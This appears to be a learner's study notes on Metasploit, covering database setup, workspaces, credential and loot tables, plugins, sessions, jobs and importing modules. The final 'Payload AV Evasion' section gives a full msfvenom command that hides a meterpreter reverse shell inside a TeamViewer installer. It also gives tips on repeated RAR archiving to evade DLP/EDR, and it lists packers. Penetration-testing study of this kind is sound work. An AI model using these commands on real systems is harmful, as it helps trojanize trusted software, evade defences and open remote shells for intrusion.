- `setg` - use to set options that will become default until the next program restart
- `grep <PAYLOAD> show payloads`
- [msf6 notes](https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/)

# MSF Databases

### Setting Up
- Make sure PostgreSQL is installed and running
- `sudo service postgresql status`
- `sudo systemctl start postgresql`

### Initiate a Database
- `sudo msfdb init`
- `sudo msfdb status`

### Connect to the Initiated Database
- `sudo msfdb run`


### Reinit the database
- Use if the db is configured and we can't change the password to the MSF username
``` bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

### MSF - Database Options
`help database`

## Using the Database
- MSFdb uses workspaces to keep things organized
- `workspace` - to view a list of workspaces
	- `workspace -a <name>` - add a workspace
	- `workspace -d <name>` - delete a workspace
	- `workspace -h` - help

### Importing Scan Results
- MSFdb can import nmap scans. XML files are preferred.
- If we wanted to import an nmap scan
	- `db_import <scan>.xml`

### Use Nmap Inside MSF
- Use `db_nmap` as you would normally use nmap
	- `db_nmap -sV -sC 192.168.1.1`

### Data Backup
- `db_export -h`
	- `dm_export -f xml backup.xml`

### Hosts
- `hosts` command displays a database table automatically populated with host names, addresses and other info found during scans and interactions.
- Hosts can be manually added
- `hosts -h` for full commands

### Services
- Works like hosts
- `services -h` for full cmd list

### Credentials
- `creds` lists discovered or added credentials
- We can add them manually, match credentials to ports, add descriptions and many other customizations
- `creds -h` has detailed information

### Loot
- `loot` works in conjunction with `creds` to show an at a glance list of owned services and users.
- The loot, in this case, refers to hash dumps like hashes, passwd, shadow, etc
- `loot -h`

# Plugins
- Stored in `/usr/share/metasploit-framework/plugins`
- If a plugin is found in that folder
	- `load <PLUGINNAME>` to load it into msf

### Installing new Plugins
- Download plugins
- Copy to msf plugin directory
- Load in msf
- Plugin commands are added to help

# Sessions
- To background a session
	- `background` or `bg` or `[CTRL]+[Z]`
- List active sessions
	- `sessions`
- Interact with a Session
	- `sessions -i [no]`

## Jobs
- Even if we manually close a session a port will still be in use.
- Instead we need to use the `jobs` command to look at the active background tasks and terminate the old ones tto free up the port
- Other types of tasks inside sessions can be converted into jobs seamlessly, even if the session dies.
- `jobs -h` for help
- `jobs -l` to list jobs
- `kill [id]` - kill a job
- `jobs -K` - kill all jobs
- To run an exploit as a background job
	- Execute it with `exploit -j`

# Adding Modules
- We can get them from exploitdb or github or wherever
- They should be named in snake case
	- All lowercase and underscores instead of spaces.
	- like_this.rb
- Make sure they go in the correct folder.
	- `/usr/share/metasploit-framework/modules/exploits/<OS>/<SERVICE>/<NAME>.rb`
- We can also use `loadpath` in MSF to load modules in from a nonstandard path
- We can also use `reload_all` which i think scans the modules directory
- Its possible to write an import custom modules into msf but i will deal with that later. heres some links
- [HTB Academy module page about porting a module from ruby into msf](https://academy.hackthebox.com/module/39/section/417)
- [rubydoc rapid7 docs](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf)
- https://www.rapid7.com/blog/post/2012/07/05/part-1-metasploit-module-development-the-series/


## Payload AV Evasion
- Injecting payload into another file
	- `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5`
		- the `-k` flag allows the application to function normally
			- however if ran in a CLI env, a terminal window will open until the session closes
- Archiving
	- RARing multiple times and changing the file extension each time can be useful for evading DLP and EDR
	- Install RAR
		- `wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz`
		- `tar -xzvf rarlinux-x64-612.tar.gz && cd rar`
		- `rar a ~/test.rar -p ~/test.js`
	- Remove the .RAR Extension
		- `mv test.rar test`
	- Repeat
- Packers
	- Compressed payload that auto decodes
		- [UPX packer](https://upx.github.io/)
		- [The Enigma Protector](https://enigmaprotector.com/)
		- [MPRESS](https://www.matcode.com/mpress.htm)
		- Alternate EXE Packer
		- ExeStealth
		- Morphine
		- MEW
		- Themida
	- Â [PolyPack project whitepaper](https://jon.oberheide.org/files/woot09-polypack.pdf)
![[Pasted image 20230325190132.png|700]]

